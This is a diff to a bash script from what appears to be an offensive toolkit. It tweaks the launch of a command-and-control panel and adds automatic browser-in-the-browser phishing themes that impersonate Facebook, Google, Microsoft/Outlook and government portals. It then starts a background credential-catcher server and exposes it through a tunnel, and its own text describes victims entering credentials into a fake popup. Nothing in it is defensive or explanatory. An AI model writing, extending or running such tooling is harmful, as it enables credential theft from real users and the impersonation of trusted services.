@@ -138,10 +138,13 @@ ensure_c2() {
 
     C2_ACTIVE_PORT="${_port:-8888}"
     if ss -tlnp 2>/dev/null | grep -q ":$C2_ACTIVE_PORT "; then
-        ok "C2 started on :$C2_ACTIVE_PORT — panel: ${W}http://localhost:$C2_ACTIVE_PORT/panel${N}"
-        if [ -n "$DISPLAY" ] || [ -n "$WAYLAND_DISPLAY" ]; then
-            xdg-open "http://localhost:$C2_ACTIVE_PORT/panel" 2>/dev/null &
-        fi
+        echo ""
+        echo -e "  ${G}╔══════════════════════════════════════════════╗${N}"
+        echo -e "  ${G}║  C2 PANEL:  http://localhost:$C2_ACTIVE_PORT/panel  ║${N}"
+        echo -e "  ${G}╚══════════════════════════════════════════════╝${N}"
+        echo ""
+        # Try to open browser — works if DISPLAY is set
+        xdg-open "http://localhost:$C2_ACTIVE_PORT/panel" 2>/dev/null &
     else
         warn "C2 failed to start — check $OP/logs/c2_auto.log"
         tail -3 "$OP/logs/c2_auto.log" 2>/dev/null
@@ -1616,13 +1619,29 @@ remote_bitb() {
     info "Victim clicks a link → sees a convincing popup → enters credentials"
     echo ""
 
+    # Auto-select BitB theme based on target domain
+    local _theme="blank"
+    case "${TARGET_DOMAIN,,}" in
+        *facebook*)  _theme="facebook" ;;
+        *google*|*gmail*|*youtube*) _theme="google" ;;
+        *outlook*|*microsoft*|*live*|*hotmail*) _theme="outlook" ;;
+        *julazone*)  _theme="julazone" ;;
+        *gov*|*government*|*portal*) _theme="gov-portal" ;;
+    esac
+    if [ -f "$BITB_DIR/themes/$_theme/index.html" ]; then
+        cp "$BITB_DIR/themes/$_theme/index.html" "$BITB_DIR/index.html"
+        ok "BitB theme: $_theme (matched $TARGET_DOMAIN)"
+    else
+        ok "BitB theme: default (no match for $TARGET_DOMAIN)"
+    fi
+
     step "4a" "Starting BitB catcher server..."
     pkill -f "catcher.py" 2>/dev/null
     cd "$BITB_DIR"
     nohup python3 catcher.py > /tmp/bitb_server.log 2>&1 &
     sleep 2
-    CATCHER_PORT=$(grep "CATCHER_PORT\|on port" /tmp/bitb_server.log 2>/dev/null | grep -oE '[0-9]{4}' | head -1)
-    ok "Catcher running"
+    CATCHER_PORT=$(grep "CATCHER_PORT\|on port\|BitB catcher" /tmp/bitb_server.log 2>/dev/null | grep -oE '[0-9]{4,5}' | head -1)
+    ok "Catcher running on :${CATCHER_PORT:-8082}"
 
     open_tunnel 8082
 
